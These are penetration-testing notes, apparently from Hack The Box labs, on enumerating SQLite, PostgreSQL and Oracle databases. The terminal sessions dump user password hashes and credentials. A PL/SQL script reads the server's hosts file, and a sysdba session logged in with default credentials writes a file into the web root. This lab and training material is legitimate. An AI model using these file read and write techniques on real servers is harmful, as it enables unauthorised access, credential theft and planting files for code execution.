# Enumerating Non-MySQL DBs

## SQLite

If you get an sqlite DB, you can use Kali's `sqlite3` to enumerate it.

```shell
root@Kali:~/HTB/Doctor/DBs# sqlite3 clean_site.db
SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
sqlite> .databases
main: /root/HTB/Doctor/DBs/clean_site.db
sqlite> .tables
post  user
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
```

or you can just dump the DB with `sqlite3 Audit.db .dump`

## Postgresql

Connect to it, note that here I specified a DB in advance.

```shell
root@Kali:~/HTB/Bitlab# psql -U profiles -h localhost -p 5433 profiles
Password for user profiles: 
psql (11.3 (Debian 11.3-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
Type "help" for help.

profiles=>
```

List DBs available

```shell
profiles=> \list
                             List of databases
   Name    |  Owner   | Encoding | Collate | Ctype |   Access privileges   
-----------+----------+----------+---------+-------+-----------------------
 gitlab    | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | gitlab=CTc/postgres
 postgres  | postgres | UTF8     | C       | C     | 
 profiles  | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | profiles=CTc/postgres
 template0 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
 template1 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
(5 rows)
```

To change DBs

```shell
profiles=> \c gitlab
psql (11.3 (Debian 11.3-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
You are now connected to database "gitlab" as user "profiles".
gitlab=>
```

List tables in DB

```shell
profiles=> \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | profiles | table | profiles
(1 row)
```

Select all rows in table

```shell
profiles=> SELECT * from profiles;
 id | username |        password        
----+----------+------------------------
  1 | clave    | c3NoLXN0cjBuZy1wQHNz==
(1 row)
```

## Oracle database

Refer to [this](https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Silo/Enumerating-Oracle-DB.md) for enumerating DB contents.

Reading files. Use script [from here](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more#read-write-files)

```text
root@kali:~/CTF/HTB/Silo# cat read_hosts.sql

SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN ('C:/Windows/System32/drivers/etc','hosts','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

root@kali:~/CTF/HTB/Silo# rlwrap -r sqlplus scott/tiger@10.10.10.82:1521/XE 'as sysdba'

SQL*Plus: Release 19.0.0.0.0 - Production on Fri Dec 25 19:58:40 2020
Version 19.9.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> @read_hosts.sql
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

PL/SQL procedure successfully completed.
```

Writing files (upload to DB server)

Use this [.sql script](https://github.com/0xdea/exploits/blob/master/oracle/raptor_orafile.sql). This writes test.txt consisting of "Testing write" to C:\inetpub\wwwroot.

```text
root@kali:~/CTF/HTB/Silo# rlwrap -r sqlplus scott/tiger@10.10.10.82:1521/XE 'as sysdba'

SQL*Plus: Release 19.0.0.0.0 - Production on Fri Dec 25 20:00:24 2020
Version 19.9.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> @raptor_orafile.sql

Procedure created.


Procedure created.

SQL> exec utlwritefile('C:/inetpub/wwwroot', 'test.txt', 'Testing write');

PL/SQL procedure successfully completed.
```

This is a very [useful reference](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) for SQLI, noting in particular that you can't cannot just `SELECT ` without specifying `FROM`.